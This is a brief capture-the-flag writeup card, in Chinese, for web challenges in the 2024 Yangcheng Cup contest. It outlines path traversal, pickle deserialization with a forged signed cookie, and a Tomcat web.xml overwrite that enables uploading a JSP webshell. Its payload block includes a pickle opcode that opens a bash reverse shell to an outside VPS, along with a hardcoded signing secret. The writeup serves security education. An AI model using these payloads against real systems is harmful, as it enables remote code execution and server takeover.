---
title: "2024 年\"羊城杯\"粤港澳大湾区网络安全大赛 Writeup"
category: web
tags: ["羊城杯", "web", "Flask pickle 反序列化 cookie", "cookie_check 逻辑缺陷", "hmac-md5 签名", "bottle template pickle"]
signals: ["羊城杯 2024", "Flask pickle 反序列化 cookie", "cookie_check 逻辑缺陷", "hmac-md5 签名", "bottle template pickle", "Tomcat conf 覆盖", "web.xml PUT/DELETE", "base64-steghide", "AI prompt injection", "deserialize", "lfi", "file_read", "Flask", "pickle"]
difficulty: hard
source: "https://www.ctfiot.com/201747.html"
tools: ["Flask", "steghide"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 2024 年"羊城杯"粤港澳大湾区网络安全大赛 Writeup

> 赛事：羊城杯 2024 | 方向：web | 难度：hard | 工具：Flask、steghide

## 一句话总结

Flask pickle cookie + Tomcat conf 覆盖 PUT 上传 jsp。

## 攻击链

1. 1. Lyrics For You: /lyrics 路径穿越读源码 / 2. /board pickle 反序列化 → 构造 cos.system opcode → MD5 签名伪造 cookie / 3. tomtom2: /myapp/read 任意读 tomcat-users.xml → 覆盖 web.xml 启用 PUT + .txt→jsp 映射 → 上传 jsp 马

## 关键 payload

```
opcode=b'(cos\nsystem\nS'bash -c "bash -i >& /dev/tcp/VPS/3333 0>&1"'\no.' ; secret="EnjoyThePlayTime123456" ; cookie = cookie_encode(('user', opcode), secret) ; PUT /myapp/upload?path=../../../../opt/tomcat/conf 上传 web.xml
```

## 经验教训

Tomcat conf/web.xml 覆盖 + PUT 启用 readonly=false 即可上传 .txt 当 jsp 解析。

## 标签

Flask pickle 反序列化 cookie、cookie_check 逻辑缺陷、hmac-md5 签名、bottle template pickle、Tomcat conf 覆盖、web.xml PUT/DELETE、base64-steghide、AI prompt injection

## 参考来源

- https://www.ctfiot.com/201747.html
- 原文件：2024年“羊城杯”粤港澳大湾区网络安全大赛Writeup.full.md
